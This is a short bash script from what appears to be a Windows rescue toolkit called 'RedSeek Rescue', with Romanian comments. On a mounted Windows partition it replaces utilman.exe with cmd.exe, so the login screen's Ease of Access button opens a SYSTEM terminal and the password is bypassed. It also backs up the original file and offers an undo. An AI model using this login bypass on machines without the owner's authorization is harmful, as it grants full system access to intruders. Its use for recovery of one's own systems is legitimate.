#!/usr/bin/env bash
# RedSeek Rescue - utilman-hack.sh
# Înlocuiește butonul de Accesibilitate cu cmd.exe (bypass login)

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &>/dev/null && pwd)"
source "${SCRIPT_DIR}/utils.sh"

require_root

MOUNT_BASE="/mnt/windows"
BACKUP_DIR="/opt/rescue/registry-backup"
mkdir -p "$BACKUP_DIR"

REAL_SYSTEM32=$(find_ci "$MOUNT_BASE" "Windows/System32")

if [ -z "$REAL_SYSTEM32" ]; then
    log_error "System32 nu a fost găsit. Este Windows-ul montat?"
    exit 1
fi

hack() {
    if [ ! -f "${REAL_SYSTEM32}/utilman.exe" ]; then
        log_error "utilman.exe nu există."
        exit 1
    fi

    cp "${REAL_SYSTEM32}/utilman.exe" "${BACKUP_DIR}/utilman.exe.bak"
    log_success "Backup salvat: ${BACKUP_DIR}/utilman.exe.bak"

    cp "${REAL_SYSTEM32}/cmd.exe" "${REAL_SYSTEM32}/utilman.exe"
    log_success "utilman.exe înlocuit cu cmd.exe"

    echo ""
    echo -e "${YELLOW}La login: click Ease of Access → terminal SYSTEM${NC}"
}

undo() {
    if [ -f "${BACKUP_DIR}/utilman.exe.bak" ]; then
        cp "${BACKUP_DIR}/utilman.exe.bak" "${REAL_SYSTEM32}/utilman.exe"
        log_success "utilman.exe original restaurat."
    else
        log_error "Nu există backup."
        exit 1
    fi
}

case "${1:-hack}" in
    hack)  hack ;;
    undo)  undo ;;
    *)
        echo "Folosire:"
        echo "  utilman-hack.sh       — înlocuiește utilman.exe cu cmd.exe"
        echo "  utilman-hack.sh undo  — restaurează originalul"
        ;;
esac
